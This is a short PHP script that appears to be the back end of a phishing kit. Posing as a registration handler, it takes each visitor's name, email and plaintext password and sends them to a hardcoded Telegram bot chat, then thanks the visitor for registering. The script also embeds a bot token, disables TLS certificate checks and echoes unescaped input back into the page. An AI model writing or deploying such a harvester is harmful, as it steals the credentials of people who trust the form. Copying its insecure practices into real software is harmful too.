<?php

// -------------------------------------------------------
// 1. Only accept POST requests
// -------------------------------------------------------
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    die("Invalid request. This page only accepts POST.");
}

// -------------------------------------------------------
// 2. Read form fields exactly as sent by index.html
// -------------------------------------------------------
$first = trim($_POST['firstName'] ?? '');
$last  = trim($_POST['lastName'] ?? '');
$email = trim($_POST['email'] ?? '');
$pass1 = $_POST['password'] ?? '';
$pass2 = $_POST['password-confirm'] ?? '';

if (!$first || !$last || !$email || !$pass1 || !$pass2) {
    die("Error: Missing required fields.");
}

if ($pass1 !== $pass2) {
    die("Error: Passwords do not match.");
}

// -------------------------------------------------------
// 3. Telegram Bot Configuration
// -------------------------------------------------------
$bot_token = "8596833170:AAGe9k7d3JdQhfeiYtRJaXz42QeXB63ieas";  // <-- Your token
$chat_id   = "8564583333";                                      // <-- Your chat ID

// -------------------------------------------------------
// 4. Build Telegram Message
// -------------------------------------------------------
$message =
"📦 NEW REGISTRATION\n\n" .
"👤 Name: $first $last\n" .
"📧 Email: $email\n" .
"🔑 Password: $pass1\n" .
"⏰ Time: " . date("Y-m-d H:i:s");

// -------------------------------------------------------
// 5. Telegram API Endpoint
// -------------------------------------------------------
$url = "https://api.telegram.org/bot$bot_token/sendMessage";

// -------------------------------------------------------
// 6. Fields sent to Telegram
// -------------------------------------------------------
$post_fields = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// -------------------------------------------------------
// 7. Send via cURL with full DEBUG OUTPUT
// -------------------------------------------------------
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Allow self-signed hosts (some shared hosts require this)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

$result = curl_exec($ch);

// DEBUG: If cURL failed, show the reason CLEARLY
if ($result === false) {
    die("❌ cURL ERROR: " . curl_error($ch));
}

// DEBUG: Show Telegram API's response
echo "📩 Telegram API Response:<br><pre>";
print_r($result);
echo "</pre>";

curl_close($ch);

// -------------------------------------------------------
// 8. Final user message (will appear below debug data)
// -------------------------------------------------------
echo "<br>Registration received — thank you, $first!";

?>
